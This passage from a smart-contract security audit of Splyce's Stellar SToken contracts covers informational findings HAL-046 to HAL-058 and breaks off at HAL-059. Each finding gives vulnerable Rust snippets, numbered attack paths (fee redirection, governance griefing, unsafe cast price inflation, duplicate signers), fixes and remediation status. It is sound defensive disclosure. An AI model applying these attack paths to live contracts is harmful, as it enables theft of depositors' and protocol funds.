```

`SToken.initialize()`: timestamp initialized to zero

```rust
// contracts/stoken/src/stoken.rs (line 307)
write_pending_price(&env, None);
write_max_deviation_bps(&env, &config.max_deviation_bps.unwrap_or(50));
write_last_price_update_timestamp(&env, &0); // first update always bypasses SToken-side cooldown
```

**Impact.**

In Scenario A, a NAV provider operating with any `cooldown_secs` value can submit incremental price changes at 5-minute intervals to gradually move the vault share price in a desired direction, bypassing the operator's intended rate-limit. The SToken vault still enforces its own `price_update_cooldown_secs` (300s), so this is a defense-in-depth gap rather than a complete absence of rate-limiting. In Scenario B, the combination of `cooldown_secs = 0` and `last_price_update_timestamp = 0` removes all rate-limit protection and allows a rogue or compromised provider to front-run the first depositor with a manipulated price in the same deployment ledger.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- **Enforce cooldown in `update_vault_price_from_nav`**: Add an elapsed-time check that reads `last_nav_timestamp` and `cooldown_secs` and rejects calls where `current_time < last_nav_timestamp + cooldown_secs`. Skip when `last_nav_timestamp == 0` (first-ever update) to avoid blocking the initial price push.
- **Add `UpdateTooFrequent` to `NavOracleError`**: Add the new error variant for the rejection path above.
- **Enforce a minimum `cooldown_secs` floor in `__constructor`**: Reject `cooldown_secs == 0` with a new `InvalidCooldown` error to prevent operators from accidentally disabling oracle-layer rate limiting at initialization.
- **Fix `SToken::initialize` timestamp**: Set `last_price_update_timestamp` to the current ledger timestamp (`env.ledger().timestamp()`) rather than `0`, so the first oracle push must also respect `price_update_cooldown_secs`. The initial valid price is set at deployment, so a brief cooldown before the first update is operationally acceptable.

**Remediation notes.**

**ACKNOWLEDGED:** The **Splyce team** fixed the exploitable half of this finding in commit [4507153](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/4507153d506ee128007d50d590a0d970ce98be57) by seeding `last_price_update_timestamp` to the deploy timestamp (closing the Scenario B first-depositor sandwich, reinforced by the pre-existing `cooldown_secs == 0` floor from FIND-045), and made a business decision to acknowledge the remaining Scenario A `NavOracle.update_vault_price_from_nav` never reading its own `cooldown_secs`) and not alter the contracts further, stating in commit [f09f3bf](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/f09f3bf5f8a2b7e8b3f5c40a47497fb8545c3db5):

> FIND-046 (informational, won't-fix): submission cadence is deliberately NOT gated by this oracle's `cooldown_secs`. That value is the governance timelock for the two-step provider/upgrader/cooldown changes only; the rate limit on oracle price pushes is enforced vault-side by `price_update_cooldown_secs` (on both the auto-apply and pending paths), alongside the always-active deviation/pending gate. Reusing the governance cooldown here would couple price liveness to governance hygiene: any value above the vault's `max_price_staleness_secs` would starve the staleness guard and freeze deposits/redeems.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-051] Multisig Constructor Allows Deployment Without Threshold Policy

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 1.47 (AO:S/AC:L/AX:M/R:N/S:C/C:N/A:M/I:H/D:N/Y:N) (source: HAL-51) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | governance-centralization |
| **Location** | `contracts/multisig/src/multisig.rs:L25-L34`, `contracts/multisig/src/multisig.rs:L25-L35` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/85cfa881be817a73732f9382866e180e27a9e98e |
| **Redacted** | false |

**Description.**

`Multisig.__constructor()` passes the caller-supplied `policies` map directly to `add_context_rule` without validating that a `ThresholdPolicy` entry is present when multiple signers are provided, allowing a multi-signer Multisig to be deployed and used as a vault admin or manager without any M-of-N enforcement.

The constructor at `multisig.rs:25-34` accepts an arbitrary `policies` map and performs no validation before writing the Default context rule:

```rust
pub fn __constructor(e: &Env, signers: Vec<Signer>, policies: Map<Address, Val>) {
    // No validation that policies contains a ThresholdPolicy when signers.len() > 1
    add_context_rule(
        e,
        &ContextRuleType::Default,
        &String::from_str(e, "multisig"),
        None,
        &signers,
        &policies,
    );
}
```

When `policies` is empty and multiple signers are provided, the `do_check_auth` flow in `get_validated_context` takes the `policies.is_empty()` branch and requires all N signers to authenticate (`rule_signers.len() == authenticated_signers.len()`). This creates a strict N-of-N account rather than the intended M-of-N. A deployer who intended a 2-of-3 configuration but accidentally omits the `ThresholdPolicy` entry will instead get a 3-of-3 account where every signer must always co-sign.

Without a `ThresholdPolicy`, the `do_check_auth` path requires unanimous consent (all N signers), so a deployer who intends M-of-N where M < N instead gets a silent N-of-N account with no on-chain error surfaced at deployment. For the single-signer case (N=1, M=1), an empty policy map produces a correctly functional 1-of-1 account and is not a deficiency.

**Impact.**

A Multisig deployed with multiple signers but an empty `policies` map silently becomes a strict N-of-N account instead of the intended M-of-N. If such a Multisig is assigned the SToken `manager` role, all manager-gated governance operations (fee changes, role assignments, vault pausing, price acceptance) require unanimous consensus; losing any signer makes governance permanently deadlocked. The misconfiguration is invisible at the contract level: on-chain state shows a valid Default rule with signers, and only the absence of a ThresholdPolicy entry distinguishes it from a correctly configured account.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- **Add a multi-signer policy guard in `__constructor`:** When more than one signer is provided, require that at least one policy (specifically a ThresholdPolicy) is present.
- **Document the single-signer exception:** Explicitly document that a single-signer account with no policy is a valid and intentional configuration (1-of-1), while multi-signer deployments must include a `ThresholdPolicy` to enforce M-of-N semantics.
- **Consider an optional threshold-satisfiability check at construction:** After calling `add_context_rule`, verify that any installed `ThresholdPolicy` has `threshold ≤ signers.len()` to catch configuration errors at deploy time rather than at first `__check_auth` call.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by adding a constructor guard that panics with `MultiSignerRequiresPolicy` when `signers.len() > 1 && policies.is_empty()`, preserving the valid 1-of-1 case and disclosing the acknowledged limitation that only presence (not type) of a policy can be enforced.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-052] Accountant Fee Redirect Bypasses Governance Timelock

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 1.50 (AO:S/AC:L/AX:L/R:N/S:U/C:N/A:N/I:N/D:N/Y:H) (source: HAL-52) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | governance-centralization |
| **Location** | `contracts/accountant/src/accountant.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/5aa8c1255ca6e0d29010c5f255886f784dbfc0a1 |
| **Redacted** | false |

**Description.**

`Accountant.update_recipients()` and `Accountant.update_split_ratio()` write final state immediately on a single manager-authorized call with no pending proposal and no cooldown, while the less-impactful manager-role transfer is deliberately timelocked via `propose_manager`/`accept_manager`. A compromised manager key, whether a single EOA or a compromised Multisig threshold signing set, can atomically redirect 100% of all accumulated protocol fee distributions to attacker-controlled addresses in a single ledger close.

**Exploit path:**

1. Attacker compromises the manager key.
2. Attacker calls `update_recipients(attacker_addr_1, attacker_addr_2, manager)`; `write_recipient1` and `write_recipient2` execute immediately with no intermediate pending state.
3. Attacker calls `update_split_ratio(999999, 1, manager)`; `write_weight1` and `write_weight2` execute immediately, routing effectively 100% of distributions to `recipient1`.
4. The next routine `distribute_tokens` or `distribute_xlm` call by the legitimate processor reads the newly written recipients and routes all fees to attacker-controlled addresses.
5. No monitoring window exists between steps 2-4; the change takes effect in the same ledger close as the compromise.

Note: `update_processor` already contains an identity guard (`if current_processor != new_processor`) and thus does not add meaningful attack surface for the drain path, `update_recipients` alone is sufficient for full fee redirection.

#### Code Location

`Accountant.update_recipients()`**:** immediate state write, no timelock

```rust
#[only_role(caller, "manager")] // line 260
pub fn update_recipients(
    env: Env,
    new_recipient1: Address,
    new_recipient2: Address,
    caller: Address,
) -> Result<(), AccountantError> {
    extend_contract_ttl(&env, BUMP_THRESHOLD, EXTEND_TO_DAYS);
    if new_recipient1 == new_recipient2 {
        return Err(AccountantError::InvalidRecipients);
    }
    // ...
    write_recipient1(&env, &new_recipient1); // line 275
    write_recipient2(&env, &new_recipient2); // line 276
    // No cooldown, no pending proposal, state is final immediately
    AccountantRecipientsUpdated { ... }.publish(&env);
    Ok(())
}
```

`Accountant.update_split_ratio()`**:** immediate state write, no timelock

```rust
/// Update split ratio (weights) // line 228
#[only_role(caller, "manager")]
pub fn update_split_ratio(
    env: Env,
    new_weight1: u64,
    new_weight2: u64,
    caller: Address,
) -> Result<(), AccountantError> {
    // ...
    write_weight1(&env, &new_weight1); // line 243
    write_weight2(&env, &new_weight2); // line 244
    // No cooldown, no pending proposal, state is final immediately
    AccountantSplitRatioUpdated { ... }.publish(&env);
    Ok(())
}
```

**Contrast:** timelocked manager transfer

```rust
#[only_role(caller, "manager")] // line 372
pub fn accept_manager(env: Env, caller: Address) -> Result<(), AccountantError> {
    // ...
    if timestamp < pending.timestamp + cooldown_secs { // line 383, enforces cooldown on the lower-impact role transfer
        return Err(AccountantError::ManagerChangeCooldownNotExpired);
    }
    // ...
}
```

**Impact.**

A compromised manager key can redirect all future protocol fee distributions to attacker-controlled addresses without any on-chain delay. The `distribute_tokens` and `distribute_xlm` functions read `recipient1`, `recipient2`, `weight1`, and `weight2` at call time, so the next legitimate processor-triggered distribution, regardless of when it occurs, sends 100% of accumulated fees to the attacker. Original fee recipients receive nothing from that distribution forward. No on-chain mechanism exists to detect or reverse the change before funds are transferred.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Apply the same `propose`/`accept` two-step pattern used for `propose_manager`/`accept_manager` to `update_recipients` and `update_split_ratio`: introduce `propose_recipients` (writes `PendingRecipients{new_recipient1, new_recipient2, timestamp}` to storage) and `accept_recipients` (enforces `timestamp + cooldown_secs` before writing final state), and an equivalent pair for split ratio.
- Gate both `propose_recipients` and `propose_split_ratio` behind the existing `cooldown_secs` timelock so that any fee-destination change requires the same waiting period as manager changes.
- Prioritize `update_recipients` as the highest-risk function since it directly controls fund flow destinations; `update_split_ratio` is also impactful but secondary.
- Add a cancel function for each proposal type to allow removal of mistaken or malicious pending proposals.
- Emit events on both proposal and acceptance steps to enable off-chain monitoring of pending recipient changes.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-053] Rogue Manager Blocks Cooldown Changes via Perpetual Re-Proposal

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 1.25 (AO:S/AC:L/AX:L/R:N/S:U/C:N/A:M/I:M/D:N/Y:N) (source: HAL-53) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | governance-centralization |
| **Location** | `contracts/stoken/src/stoken.rs:L2373-L2384` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/82e0236aaa9fb57516bc4e6e9c7b223362a369c5 |
| **Redacted** | false |

**Description.**

`SToken.propose_cooldowns()` returns `CooldownChangeTimelockActive` if any of `pending_fees`, `pending_limits`, `pending_whitelist`, or `pending_roles` is set (lines 2373-2384), and no cancel function exists for any of these proposals. A rogue manager can permanently block cooldown changes by continuously re-proposing fees, limits, whitelist, or roles just before the existing pending proposal reaches acceptance, resetting its timestamp and restarting the blocking condition indefinitely.

A non-rogue manager's only resolution is to accept the blocking proposal, which is gated by its own `fee_change_cooldown_secs` or `role_change_cooldown_secs`, so the rogue manager can also defer acceptance by re-proposing, compounding the block.

The attack requires the manager to be rogue or compromised and to simultaneously want to: (a) block cooldown parameter changes (e.g. preventing lengthening of cooldowns in response to an incident) while (b) not wanting any other governance change applied.

Concrete steps:

1. Rogue manager calls `propose_fees(...)` with a trivially different value. `pending_fees` is set with `timestamp = T`.
2. Any call to `propose_cooldowns(...)` hits the check at lines 2373-2384: `read_pending_fees(&env).is_some()` returns `CooldownChangeTimelockActive`.
3. As `T + fee_change_cooldown_secs` approaches (allowing acceptance), the rogue manager calls `propose_fees(...)` again with another minor variation. `pending_fees.timestamp` resets to `T'`; the acceptance window restarts.
4. No admin or guardian can override this. The only on-chain resolution path is a WASM upgrade via the `upgrader` role (gated by `admin`), which itself has its own cooldown.

#### Code Location

`SToken.propose_cooldowns()`: blocked by any active pending proposal

```rust
let can_update_cooldowns = if read_pending_fees(&env).is_none()
    && read_pending_limits(&env).is_none()
    && read_pending_whitelist(&env).is_none()
    && read_pending_roles(&env).is_none()
{
    true
} else {
    false
};
if !can_update_cooldowns {
    return Err(STokenCooldownChangeError::CooldownChangeTimelockActive);
}
```

`SToken.propose_roles()`: overwriting resets timestamp with no cancel path

```rust
// contracts/stoken/src/stoken.rs
// Note: overwriting an existing pending roles proposal is allowed, cooldown restarts.
write_pending_roles(&env, Some(PendingRoles { ..., timestamp: env.ledger().timestamp() }));  // line 504-515
```

**Impact.**

A rogue or compromised manager can indefinitely prevent cooldown parameters from being changed, including emergency lengthening of cooldowns in response to an active security incident. During an incident requiring rapid parameter adjustment, this griefing path could prevent the protocol from increasing timelock durations before a malicious governance action executes.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Remove the blocking check in `propose_cooldowns` that gates on other pending proposals, or scope it only to proposals that genuinely conflict with cooldown semantics (none do: fee, limit, role, and whitelist changes are independent of cooldown parameters). Cooldown changes should be allowed to proceed concurrently with other pending governance items.
- Alternatively, add explicit cancel functions (manager-gated) for each pending proposal type so an honest manager can clear a stuck proposal without being forced to accept it.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by replacing the blanket any-pending-proposal block in `propose_cooldowns` with a targeted `conflicts` predicate scoped to only the cooldown fields whose live value is read by an in-flight proposal's `accept_*` function, verified against the actual `accept_fees`/`accept_roles`/`accept_limits`/`accept_whitelist` implementations.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-054] Unsafe i128-to-u64 Cast Corrupts NAV Oracle Price

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 1.26 (AO:S/AC:L/AX:M/R:N/S:U/C:N/A:N/I:H/D:H/Y:N) (source: HAL-54) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | accounting-arithmetic |
| **Location** | `contracts/nav_oracle/src/nav_oracle.rs:L147-L151` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/3d0f715dee6fa245b3686b8dde91459b424c2bd9 |
| **Redacted** | false |

**Description.**

`NavOracle.update_vault_price_from_nav()` casts the vault's underlying token balance from `i128` (as returned by the Soroban SAC `token::Client::balance()`) to `u64` using a bare `as u64` truncation on line 151, with no sign check and no bounds check. The primary realistic risk is the negative-value path: a malicious or non-standard underlying token that reports a negative balance would be silently cast to a very large positive `u64`, dramatically inflating `total_nav` and causing the oracle to push an artificially high price to the SToken vault, which then applies it to all deposits, withdrawals, and swaps.

Standard Stellar tokens (including USDC via SAC) store balances as `i64` (maximum ~9.22 × 10^18, below `u64::MAX` ~1.84 × 10^19), so the truncation-above`u64::MAX` scenario requires a non-standard token; the negative-wrapping path requires either a buggy token implementation or a Stellar-layer anomaly.

The `checked_add` guard on line 151 protects only against overflow of the addition, not against the invalid cast itself.

**Exploit path (malicious underlying token):**

1. A vault is deployed with a non-standard token that can return negative `balance()` values.
2. The NAV provider calls `update_vault_price_from_nav(nav_value, expected_total_supply)`.
3. `underlying_asset.balance(&stoken_address)` returns a negative `i128`, e.g. `-1`.
4. `(-1i128) as u64 = 18_446_744_073_709_551_615`, wraps to `u64::MAX`.
5. `total_nav = nav_value + u64::MAX` overflows and the `checked_add` returns `Err`, so the function reverts in this extreme case.
6. For a moderate negative value, e.g. `-100`, the cast produces `u64::MAX - 99`, a value that passes `checked_add` when `nav_value` is small, producing an arbitrarily inflated `total_nav` and thus an inflated price pushed to the vault.

#### Code Location

`NavOracle.update_vault_price_from_nav()`**:** unsafe cast

```rust
let vault_underlying_balance = underlying_asset.balance(&stoken_address); // i128 return type

let total_nav = nav_value
    .checked_add(vault_underlying_balance as u64) // no sign check, no bounds check
    .ok_or(NavOracleError::PriceCalculationOverflow)?;
```

**Impact.**

For vaults using a malicious or non-standard underlying token that can report negative balances, the unsafe cast inflates `total_nav` and the computed share price. A boosted price causes new depositors to receive fewer shares for their tokens (value extraction from depositors) and allows early holders to redeem shares at an inflated rate (value extraction from the vault). The `expected_total_supply` guard does not protect against this because the total supply is unaffected by the corrupted balance read.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Replace the unsafe `as u64` cast with `u64::try_from(vault_underlying_balance).map_err(|_| NavOracleError::PriceCalculationOverflow)?`, `u64::try_from(i128)` already returns `Err` for both negative values and values exceeding `u64::MAX`, so this single change addresses both sub-scenarios.
- Alternatively, perform all NAV summation in `u128i128` throughout the function body and validate the final computed price fits into `u64` only at the point of the `update_price` call.
- As an additional defense, add an explicit non-negativity assertion before the cast: `if vault_underlying_balance < 0 { return Err(NavOracleError::NegativeBalance); }` to emit a semantically clear error.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by replacing the unchecked `as u64` cast with `u64::try_from(vault_underlying_balance).map_err(|_| NavOracleError::InvalidUnderlyingBalance)?`, which rejects both negative and out-of-range balance readings before they can inflate the NAV/price calculation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-055] Accountant.distribute_xlm Uses Unchecked Arithmetic Unlike distribute_tokens

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 1.03 (AO:A/AC:L/AX:H/R:N/S:U/C:N/A:N/I:L/D:N/Y:L) (source: HAL-55) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | accounting-arithmetic |
| **Location** | `contracts/accountant/src/accountant.rs:L132-L133`, `contracts/accountant/src/accountant.rs:L189-L197` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/4dfade69264e347bf4089806538528bb93de8c05 |
| **Redacted** | false |

**Description.**

`Accountant.distribute_xlm()` computes the fee split using an unchecked `as u64` cast and bare subtraction, diverging from the fully checked arithmetic pattern used in the sibling `Accountant.distribute_tokens()` function. While the intermediate `u128` multiplication cannot overflow with today's `u64` input types (maximum intermediate value is `u64::MAX * u64::MAX / u64::MAX = u64::MAX`, which fits in `u64`), and the bare `amount - amount1` subtraction cannot underflow because `amount1` is floored to at most `amount`, this is a code-quality hazard: any future widening of the `amount` parameter type to `u128` would cause the `as u64` cast to silently truncate the high bits, producing an arbitrarily incorrect split without a compile-time error. The two sibling functions that implement identical logic now diverge in safety posture, increasing maintenance risk.

#### Code Location

`Accountant.distribute_xlm()`**:** unchecked arithmetic

```rust
let amount1 = ((amount as u128 * weight1 as u128) / total_weight as u128) as u64;
let amount2 = amount - amount1; // bare subtraction
```

`Accountant.distribute_tokens()`**:** checked arithmetic (correct pattern, contrast)

```rust
let amount1_calc = (amount as u128)
    .checked_mul(weight1 as u128)
    .ok_or(AccountantError::MathOverflow)?
    .checked_div(total_weight as u128)
    .ok_or(AccountantError::MathOverflow)?;
let amount1 = u64::try_from(amount1_calc).map_err(|_| AccountantError::MathOverflow)?;
let amount2 = amount
    .checked_sub(amount1)
    .ok_or(AccountantError::MathOverflow)?;
```

**Impact.**

No immediate fund-loss risk exists with current `u64` types. However, if the `amount` parameter in `distribute_xlm` is ever widened to `u128`, a plausible refactoring given `distribute_tokens` already uses `u128` intermediates, the silent `as u64` truncation would distribute an incorrect amount to `recipient1`, assigning all rounding error and potentially a large undercount to `recipient2` without any runtime error or alert.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Mirror the checked arithmetic already used in `distribute_tokens`: use checked multiplication, division, and subtraction throughout `distribute_xlm`'s split calculation instead of bare operators and `as u64` casts, so any future overflow or truncation surfaces as an error instead of silently producing a wrong split.
- Extract the shared split-calculation logic into a private helper function shared by both `distribute_xlm` and `distribute_tokens` to prevent future divergence.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by extracting a shared `split_amounts` helper using fully checked arithmetic (`checked_add`/`checked_mul`/`checked_div`/`u64::try_from`/`checked_sub`), used by both `distribute_xlm` and `distribute_tokens`, eliminating the divergent unchecked cast and subtraction.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-056] Multisig add_signer Silently Weakens M-of-N Threshold

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 0.94 (AO:S/AC:L/AX:L/R:P/S:C/C:N/A:N/I:H/D:N/Y:N) (source: HAL-56) |
| **Difficulty / likelihood** | null |
| **Status** | Acknowledged |
| **Remediation verified by** | not-reviewed |
| **Category** | governance-centralization |
| **Location** | `contracts/multisig/src/multisig.rs:L97-L101`, `contracts/threshold_policy/src/threshold_policy.rs:L75-L82` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/430ef4ed809ae41066efe8c0fd86001afdb8cdb3 |
| **Redacted** | false |

**Description.**

`Multisig.add_signer()` delegates directly to the `stellar_accounts` library without adjusting the `SimpleThreshold.threshold` value, enabling a scenario where the effective M-of-N signing requirement silently degrades after signers are added.

When a multisig account starts with M-of-N configuration (e.g. threshold=2, signers=2) and a signer is added without raising the threshold (e.g. threshold stays at 2 but signers becomes 3), any two of three signers can authorize. If a multisig starts at 1-of-1 and a signer is added without updating the threshold, the account becomes 1-of-N, where any single signer can authorize.

The `ThresholdPolicy` enforces the stored threshold against the authenticated signer count on each `__check_auth` call, but it does not revalidate the threshold-to-signer-count ratio when the signer set grows. Because `add_signer` calls into `stellar_accounts` without any corresponding `simple_threshold::set_threshold` adjustment, the ratio can drift arbitrarily toward 1-of-N with each unaccompanied signer addition.

#### Code Location

`Multisig.add_signer()`: delegates to library with no threshold adjustment

```rust
fn add_signer(e: &Env, context_rule_id: u32, signer: Signer) {
    e.current_contract_address().require_auth();
    add_signer(e, context_rule_id, &signer);
    // threshold unchanged; signer count grows, M-of-N ratio degrades silently
}
```

`ThresholdPolicy.set_threshold()`: adjustment entrypoint that `add_signer` should invoke

```rust
pub fn set_threshold(
    e: Env,
    threshold: u32,
    context_rule: ContextRule,
    smart_account: Address,
) {
    simple_threshold::set_threshold(&e, threshold, &context_rule, &smart_account)
}
```

**Impact.**

A multisig account can drift from its configured M-of-N quorum toward a 1-of-N configuration purely through routine signer additions, with no explicit governance action to lower the threshold. Any single one of the N signers can then unilaterally authorize actions gated behind the `Multisig` account, whether it holds the `admin` or `manager` role on an `SToken` vault, `Factory`, or other privileged contract, defeating the multi-party consensus the M-of-N design is meant to guarantee.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Require callers of `add_signer` to explicitly pass a `new_threshold` argument that must be at least `ceil(new_signer_count / 2)`, and update the threshold atomically as part of the signer addition, preventing any call from inadvertently reducing the effective M-of-N ratio.
- Add a post-mutation invariant check (`validate_account_operable`) called from both `add_signer` and `remove_signer` that asserts `1 <= threshold <= signer_count`.

**Remediation notes.**

**ACKNOWLEDGED**: The **Splyce team** made a business decision to acknowledge this finding and not alter the contracts, stating that:

> Requires current M-of-N authorization (operator/insider). Documented operational procedure: raise threshold atomically with `add_signer`. No code change.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-057] ProxyAssetManager Initialize Skips Underlying Asset Validation

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 0.94 (AO:S/AC:L/AX:L/R:P/S:C/C:N/A:N/I:N/D:H/Y:N) (source: HAL-57) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | operational |
| **Location** | `contracts/proxy_asset_manager/src/proxy_asset_manager.rs:L74-L75`, `contracts/proxy_asset_manager/src/proxy_asset_manager.rs:L314-L315` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/5f643a380646cf9ab742133c23dfca2790b7a948 |
| **Redacted** | false |

**Description.**

`ProxyAssetManager.initialize()` writes the caller-supplied `config.underlying_asset` to storage with no check against the underlying asset actually used by the bound vault (`config.vault`), while `SToken.process_deposits()` always transfers the vault's real underlying asset to the proxy regardless of what the proxy itself was configured to expect.

**Exploit path:**

1. `ProxyAssetManager.initialize()` writes `config.vault` and `config.underlying_asset` independently, with no cross-contract call to the vault to confirm they refer to the same token; the two contracts are deployed and initialized in separate transactions per the deployment scripts.
2. An operator initializes `ProxyAssetManager` with `config.vault = V` and `config.underlying_asset` set to a token address that differs from `V`'s actual underlying asset, for example a stale address carried over from a different environment's config file.
3. A processor calls `V.process_deposits(amount, processor)`, which transfers `V`'s real underlying asset to the proxy; this call succeeds because `SToken` uses its own configured asset, never the proxy's.
4. Any subsequent call to `forward_funds()`, `return_funds()`, or `emergency_sweep()` builds its `token::Client` from `read_underlying_asset()`, the mismatched address written in step 1, and attempts to move a token the proxy holds a zero balance of.

#### Code Location

`ProxyAssetManager.initialize()`**:** vault and underlying asset written independently

```rust
write_vault(&env, &config.vault);
write_underlying_asset(&env, &config.underlying_asset); // no check against config.vault's real asset
```

`ProxyAssetManager.forward_funds()`**:** every fund-movement function trusts the unchecked value

```rust
let underlying = read_underlying_asset(&env);
let token_client = token::Client::new(&env, &underlying);
```

**Impact.**

Every `process_deposits` transfer sent to the proxy after a mismatched initialization is denominated in the vault's real underlying asset, while `forward_funds`, `return_funds`, and `emergency_sweep` all operate on the misconfigured `underlying_asset` address. All three revert against the proxy's actual balance, and since no function in the proxy's public interface can update `underlying_asset` after initialization, every token delivered by `process_deposits` becomes unreachable through any callable path.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend that `ProxyAssetManager.initialize()` perform a cross-contract call to `config.vault` (`query_asset()`) and reject initialization if the returned address does not match `config.underlying_asset`.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by adding a cross-contract validation call in `initialize()` that rejects the vault seed unless `vault.query_asset() == config.underlying_asset` and `vault.asset_manager() == self`, matching the recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-058] Duplicate Signer Key Onboardable Via Second Verifier

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 0.94 (AO:S/AC:L/AX:L/R:P/S:C/C:N/A:N/I:H/D:N/Y:N) (source: HAL-58) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | governance-centralization |
| **Location** | `contracts/multisig/src/multisig.rs:L97-L100` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/780d5f8c557c8a0f0ea7b5badb2631a516516fe8 |
| **Redacted** | false |

**Description.**

`Multisig.add_signer()` forwards a new `Signer::External(verifier, key_data)` to the `stellar_accounts` library, which deduplicates signers by comparing the full `(verifier, key_data)` pair rather than the underlying key material alone, so the same Ed25519 public key can be registered twice under two different verifier contract addresses.

**Exploit path:**

1. An existing signer holding key `pubkey_A` under `Ed25519Verifier` instance `verifier_1` proposes adding themselves again as `Signer::External(verifier_2, pubkey_A)`, where `verifier_2` is a second, functionally identical deployment of the same `Ed25519Verifier` WASM.
2. The proposal goes through the Multisig's normal governance flow and requires the existing quorum to approve `Multisig.add_signer()`, which calls straight through to `stellar_accounts::smart_account::storage::add_signer`.
3. `add_signer()` checks `signers.contains(signer)` before inserting; this equality check compares the whole `Signer::External(verifier, key_data)` enum, so `Signer::External(verifier_1, pubkey_A)` and `Signer::External(verifier_2, pubkey_A)` are not equal and the `DuplicateSigner` guard never fires.
4. Both entries are added to the same `ContextRule`. A single signature produced by the one private key behind `pubkey_A`, submitted once against each verifier address, authenticates as two distinct entries in `authenticated_signers`.

#### Code Location

`Multisig.add_signer()`**:** forwards to the library with no key-material dedup

```rust
fn add_signer(e: &Env, context_rule_id: u32, signer: Signer) {
    e.current_contract_address().require_auth();
    add_signer(e, context_rule_id, &signer);
}
```

`add_signer()`(**stellar-accounts 0.5.0** dependency): dedup compares the full (verifier, key_data) tuple

```rust
// stellar-accounts-0.5.0/src/smart_account/storage.rs
pub fn add_signer(e: &Env, id: u32, signer: &Signer) { // line 878
    let rule = get_context_rule(e, id);
    let mut signers = rule.signers.clone();

    if signers.contains(signer) { // equality on the whole Signer enum
        panic_with_error!(e, SmartAccountError::DuplicateSigner)
    }

    signers.push_back(signer.clone());
```

**Impact.**

One physical Ed25519 key can occupy two signer slots in the same `ContextRule`, so a threshold expressed as M-of-N is effectively M-of-(N-1) or lower from that key holder's perspective. A signer who controls both entries needs one fewer independent cosigner to reach quorum than the configured threshold implies, understating the real security margin without triggering the library's own `DuplicateSigner` protection.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend requiring a single canonical verifier address per smart account, which makes signer identity well-defined and lets `Multisig.add_signer()` reject any `key_data` that already matches an existing signer before delegating to the library. Deduplicating on `key_data` alone across different verifiers is a weaker fallback, since it only holds if every registered verifier interprets `key_data` the same way.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by pinning a single canonical `Signer::External` verifier address per Multisig account (enforced in the constructor, `add_context_rule`, and `add_signer`, with unpinning on full External-signer removal), which makes the library's own `DuplicateSigner` dedup an exact key-material check.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-059] Pending Price Path Skips Cooldown Write, Enabling Repeated Overwrite

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 0.84 (AO:A/AC:L/AX:M/R:F/S:U/C:N/A:N/I:M/D:N/Y:N) (source: HAL-59) |
| **Difficulty / likelihood** | null |
